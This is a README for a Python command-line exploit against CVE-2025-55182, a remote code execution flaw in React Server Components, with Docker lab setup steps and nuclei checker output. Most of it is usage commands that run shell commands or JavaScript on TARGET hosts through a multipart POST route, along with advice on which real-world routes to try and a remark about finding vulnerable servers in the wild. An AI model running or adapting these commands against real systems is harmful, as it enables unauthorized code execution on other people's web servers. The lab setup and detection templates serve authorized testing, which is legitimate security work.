# CVE-2025-55182 - React Server Components RCE Exploit

Python CLI exploit for CVE-2025-55182, a critical RCE vulnerability in React Server Components via `react-server-dom-webpack`.

**Based on:** [ejpir/CVE-2025-55182-poc](https://github.com/ejpir/CVE-2025-55182-poc)

**Behaviour:** you will be a super lucky dude if you were able find this in the wild. First of all you need to find vulnerable react-server-dom-webpack, then find a POST route which accept multipart/form-data and then - vulnerable gadget, which could be easily disabled :) Good luck!

## Quick Start

### Docker Testing

```bash
# Unpack src.zip
zip -r src.zip src

# Build and run vulnerable container
docker build -t cve-2025-55182-vuln .
docker run -d -p 3002:3002 --name cve-2025-55182 cve-2025-55182-vuln
sleep 3

# Check vulnerability
python3 exploit.py --ip localhost --port 3002 --post-endpoint "/formaction" --check

# Execute commands
python3 exploit.py --ip localhost --port 3002 --post-endpoint "/formaction" --cmd "id"
python3 exploit.py --ip localhost --port 3002 --post-endpoint "/formaction" --cmd "whoami" --no-ssl-verify

# Cleanup
docker stop cve-2025-55182 && docker rm cve-2025-55182
```

## Usage

```bash
!!!Be aware about custom route: '/formaction'.
# Custom route in initial PoC:
https://github.com/ejpir/CVE-2025-55182-poc/blob/main/src/server.js

'/formaction' - is the custom route for the POST request (multipart/form-data).
This route should be replaced in real-life scenario testing.

# Check vulnerability
python3 exploit.py --ip TARGET --port 3002 --post-endpoint "/formaction" --check --no-ssl-verify
python3 exploit.py --url https://target.com:3002 --post-endpoint "/formaction" --check

# Execute command
python3 exploit.py --ip TARGET --port 3002 --post-endpoint "/formaction" --cmd "COMMAND"

# Execute JavaScript
python3 exploit.py --url http://TARGET:3002 --post-endpoint "/formaction" --code "Math.PI * 2"
python3 exploit.py --url https://TARGET:3002 --post-endpoint "/formaction" --code "Math.PI * 2"

# Use custom endpoint
python3 exploit.py --ip TARGET --port 3002 --post-endpoint "/api/v1/login" --cmd "whoami" --no-ssl-verify
```

## Checker with nuclei (no RCE, only with Math.PI and package.json version)

```bash
# Custom route:
https://github.com/ejpir/CVE-2025-55182-poc/blob/main/src/server.js

'/formaction' - is the custom route for the POST request (multipart/form-data).
This route should be replaced in real-life scenario testing.
Possible routes:

'/api/actions'
'/api/server-actions'
'/api/v1/login'
'etc..'

# Check vulnerability by package.json analysis (if package.json is accessible):
nuclei -t ~/cve-2025-55182-versions.yaml -u http://localhost:3005

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

		projectdiscovery.io

[INF] Current nuclei version: v3.4.10 (outdated)
[INF] Current nuclei-templates version: v10.3.4 (latest)
[INF] New templates added in latest release: 0
[INF] Templates loaded for current scan: 1
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[CVE-2025-55182-versions] [http] [critical] http://localhost:3005/package.json
[CVE-2025-55182-versions] [http] [critical] http://localhost:3005/package-lock.json
[CVE-2025-55182-versions] [http] [critical] http://localhost:3005/node_modules/react-server-dom-webpack/package.json
[CVE-2025-55182-versions] [http] [critical] http://localhost:3005/react-server-dom-webpack/package.json
[INF] Scan completed in 81.999998ms. 4 matches found.

# Check vulnerability with Math.PI
nuclei -t cve-2025-55182.yaml -u http://localhost:3005

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.10

		projectdiscovery.io

[INF] Current nuclei version: v3.4.10 (outdated)
[INF] Current nuclei-templates version: v10.3.4 (latest)
[INF] New templates added in latest release: 0
[INF] Templates loaded for current scan: 1
[WRN] Loading 1 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[CVE-2025-55182] [http] [critical] http://localhost:3005/formaction
[INF] Scan completed in 14.991675ms. 1 matches found.
```

## Affected Versions

- `react-server-dom-webpack or react-server-dom-parcel or react-server-dom-turbopack`:
19.0.0, 19.1.0, 19.1.1, 19.2.0
- `Next.js`: 15.x, 16.x (App Router)

## Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY**
